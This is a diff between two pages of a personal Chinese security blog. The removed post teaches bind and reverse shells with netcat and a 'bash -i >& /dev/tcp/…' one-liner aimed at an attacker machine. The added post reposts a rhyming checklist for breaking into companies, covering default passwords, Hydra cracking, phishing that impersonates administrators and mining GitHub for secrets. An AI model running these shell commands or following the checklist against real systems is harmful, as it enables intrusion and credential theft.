@@ -16,25 +16,21 @@
   <meta name="author" content="Rounuooo">
   <meta name="keywords" content="">
   
-    <meta name="description" content="假如ubuntu、CentOS为目标服务器系统 kali为攻击者的系统，ip为：192.168.0.4，开放7777端口且没被占用 最终是将ubuntu、CentOS的shell反弹到kali上 正向反弹shell目标机(ubuntu或者CentOS)上面输入1nc -lvp 端口号 -e &#x2F;bin&#x2F;bash  攻击机上输入1nc ip 端口号  正向反弹是目标机先执行nc命令，然后攻击机上再进行">
+    <meta name="description" content="看到的一段话,觉得很有意思,转载一下。 搞企业，先扫描；扫描器，商业好； &#x2F;&#x2F; 商业版扫描器通常比较强大默认密，都知道； &#x2F;&#x2F; 很多系统存在默认账号默认口令社工库，找一找；邮箱号，先列好； &#x2F;&#x2F; 搜集企业员工个人邮箱九头蛇，跑一跑； &#x2F;&#x2F; Hydra 是一个密码破解工具搞不定，放大招；发邮件，凭伪造； &#x2F;&amp;#">
 <meta property="og:type" content="article">
-<meta property="og:title" content="正向shell和反向shell">
-<meta property="og:url" content="http://example.com/2022/10/19/%E6%AD%A3%E5%90%91shell%E5%92%8C%E5%8F%8D%E5%90%91shell/index.html">
+<meta property="og:title" content="企业网络的常见渗透思路">
+<meta property="og:url" content="http://example.com/2022/10/20/%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E5%B8%B8%E8%A7%81%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/index.html">
 <meta property="og:site_name" content="Rounuooo的小站">
-<meta property="og:description" content="假如ubuntu、CentOS为目标服务器系统 kali为攻击者的系统，ip为：192.168.0.4，开放7777端口且没被占用 最终是将ubuntu、CentOS的shell反弹到kali上 正向反弹shell目标机(ubuntu或者CentOS)上面输入1nc -lvp 端口号 -e &#x2F;bin&#x2F;bash  攻击机上输入1nc ip 端口号  正向反弹是目标机先执行nc命令，然后攻击机上再进行">
+<meta property="og:description" content="看到的一段话,觉得很有意思,转载一下。 搞企业，先扫描；扫描器，商业好； &#x2F;&#x2F; 商业版扫描器通常比较强大默认密，都知道； &#x2F;&#x2F; 很多系统存在默认账号默认口令社工库，找一找；邮箱号，先列好； &#x2F;&#x2F; 搜集企业员工个人邮箱九头蛇，跑一跑； &#x2F;&#x2F; Hydra 是一个密码破解工具搞不定，放大招；发邮件，凭伪造； &#x2F;&amp;#">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/%E6%AD%A3%E5%90%91shell%E5%92%8C%E5%8F%8D%E5%90%91shell/image-20221019201817575.png">
-<meta property="og:image" content="http://example.com/images/image-20221019201951687.png">
-<meta property="og:image" content="http://example.com/images/image-20221019202129236.png">
-<meta property="article:published_time" content="2022-10-19T12:30:37.000Z">
-<meta property="article:modified_time" content="2022-10-19T12:53:18.239Z">
+<meta property="article:published_time" content="2022-10-20T09:16:08.000Z">
+<meta property="article:modified_time" content="2022-10-20T10:24:28.635Z">
 <meta property="article:author" content="Rounuooo">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/%E6%AD%A3%E5%90%91shell%E5%92%8C%E5%8F%8D%E5%90%91shell/image-20221019201817575.png">
   
   
   
-  <title>正向shell和反向shell - Rounuooo的小站</title>
+  <title>企业网络的常见渗透思路 - Rounuooo的小站</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -199,7 +195,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="正向shell和反向shell"></span>
+            <span id="subtitle" data-typed-text="企业网络的常见渗透思路"></span>
           
         </div>
 
@@ -210,8 +206,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-10-19 20:30" pubdate>
-          2022年10月19日 晚上
+        <time datetime="2022-10-20 17:16" pubdate>
+          2022年10月20日 下午
         </time>
       </span>
     
@@ -222,7 +218,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          460 字
+          539 字
         
       </span>
     
@@ -233,7 +229,7 @@
         
         
         
-          4 分钟
+          5 分钟
         
       </span>
     
@@ -271,27 +267,14 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">正向shell和反向shell</h1>
+            <h1 style="display: none">企业网络的常见渗透思路</h1>
             
             
               <div class="markdown-body">
                 
-                <p>假如ubuntu、CentOS为目标服务器系统</p>
-<p>kali为攻击者的系统，ip为：192.168.0.4，开放7777端口且没被占用</p>
-<p>最终是将ubuntu、CentOS的shell反弹到kali上</p>
-<h3 id="正向反弹shell"><a href="#正向反弹shell" class="headerlink" title="正向反弹shell"></a>正向反弹shell</h3><h5 id="目标机-ubuntu或者CentOS-上面输入"><a href="#目标机-ubuntu或者CentOS-上面输入" class="headerlink" title="目标机(ubuntu或者CentOS)上面输入"></a>目标机(ubuntu或者CentOS)上面输入</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">nc -lvp 端口号 -e <span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure>
-
-<h5 id="攻击机上输入"><a href="#攻击机上输入" class="headerlink" title="攻击机上输入"></a>攻击机上输入</h5><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">nc</span> <span class="hljs-built_in">ip</span> 端口号<br></code></pre></td></tr></table></figure>
-
-<p>正向反弹是目标机先执行nc命令，然后攻击机上再进行nc监听，即可反弹shell。</p>
-<p>需要目标机安装nc。</p>
-<h3 id="反向反弹shell"><a href="#反向反弹shell" class="headerlink" title="反向反弹shell"></a>反向反弹shell</h3><p>方法1：bash反弹</p>
-<h5 id="被控制端-bash-i-gt-amp-x2F-dev-x2F-tcp-x2F-攻击机的ip-x2F-port-0-gt-amp-1"><a href="#被控制端-bash-i-gt-amp-x2F-dev-x2F-tcp-x2F-攻击机的ip-x2F-port-0-gt-amp-1" class="headerlink" title="被控制端:	bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击机的ip&#x2F;port 0&gt;&amp;1"></a>被控制端:	bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击机的ip&#x2F;port 0&gt;&amp;1</h5><p><img src="/%E6%AD%A3%E5%90%91shell%E5%92%8C%E5%8F%8D%E5%90%91shell/image-20221019201817575.png" srcset="/img/loading.gif" lazyload alt="image-20221019201817575"></p>
-<h5 id="但首先需要在攻击机上使用nc监听端口：nc-lvp-端口号"><a href="#但首先需要在攻击机上使用nc监听端口：nc-lvp-端口号" class="headerlink" title="但首先需要在攻击机上使用nc监听端口：nc -lvp 端口号"></a>但首先需要在攻击机上使用nc监听端口：nc -lvp 端口号</h5><p><img src="/images/image-20221019201951687.png" srcset="/img/loading.gif" lazyload alt="image-20221019201951687"></p>
-<p>此时就可以获得shell</p>
-<p><img src="/images/image-20221019202129236.png" srcset="/img/loading.gif" lazyload alt="image-20221019202129236"></p>
-<p>此方法在ubuntu下不会反弹成功，CentOS可以反弹成功</p>
-<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>​		无论是正向shell还是反弹shell，都是A控制B，只是请求端不一样，一个是主动控制，一个被动控制，与<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86&spm=1001.2101.3001.7020">正向代理</a>和反向代理一样。<br>​		反弹shell就会更加的稳定，用途更大。</p>
+                <p>看到的一段话,觉得很有意思,转载一下。</p>
+<p>搞企业，先扫描；<br>扫描器，商业好； &#x2F;&#x2F; 商业版扫描器通常比较强大<br>默认密，都知道； &#x2F;&#x2F; 很多系统存在默认账号默认口令<br>社工库，找一找；<br>邮箱号，先列好； &#x2F;&#x2F; 搜集企业员工个人邮箱<br>九头蛇，跑一跑； &#x2F;&#x2F; Hydra 是一个密码破解工具<br>搞不定，放大招；<br>发邮件，凭伪造； &#x2F;&#x2F; 发钓鱼邮件，比如冒充管理员让用户到指定页面去输入密码<br>没邮箱，搞网站；<br>二级域，皆可爆； &#x2F;&#x2F; 主域的防护通常较好，某些较弱的二级域可作为突破点<br>老漏洞，没修好； &#x2F;&#x2F; 有些老漏洞可能没有被恰当地修复，工作失误也可能让漏洞回归<br>新漏洞，刷一票； &#x2F;&#x2F; 大部分企业对漏洞能做到一周内修复就算三好学生了<br>干研发，Git  找； &#x2F;&#x2F; 常有人把为公司写的代码也传到github上，里面可能会包含口令等<br>源代码，全都要； &#x2F;&#x2F; 即使源码不包含口令，也很有助于发现漏洞<br>CDN ，  可以跳；<br>防火墙，可以撬；<br>堡垒机，可以绕；<br>云防护，可以秒； &#x2F;&#x2F; 各种防护措施都不是有了就行，需要正确地使用<br>是企业，没有哪家搞不了！</p>
+<p>:rabbit:</p>
 
                 
               </div>
@@ -309,8 +292,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>正向shell和反向shell</div>
-      <div>http://example.com/2022/10/19/正向shell和反向shell/</div>
+      <div>企业网络的常见渗透思路</div>
+      <div>http://example.com/2022/10/20/企业网络的常见渗透思路/</div>
     </div>
     <div class="license-meta">
       
@@ -322,7 +305,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年10月19日</div>
+          <div>2022年10月20日</div>
         </div>
       
       
@@ -354,18 +337,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/10/20/%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E5%B8%B8%E8%A7%81%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/" title="企业网络的常见渗透思路">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">企业网络的常见渗透思路</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/10/16/%E7%AE%80%E8%BF%B0CSRF%E5%92%8CSSRF%E7%9A%84%E5%8C%BA%E5%88%AB/" title="简述CSRF和SSRF的区别">
-                        <span class="hidden-mobile">简述CSRF和SSRF的区别</span>
+                      <a href="/2022/10/19/%E6%AD%A3%E5%90%91shell%E5%92%8C%E5%8F%8D%E5%90%91shell/" title="正向shell和反向shell">
+                        <span class="hidden-mobile">正向shell和反向shell</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
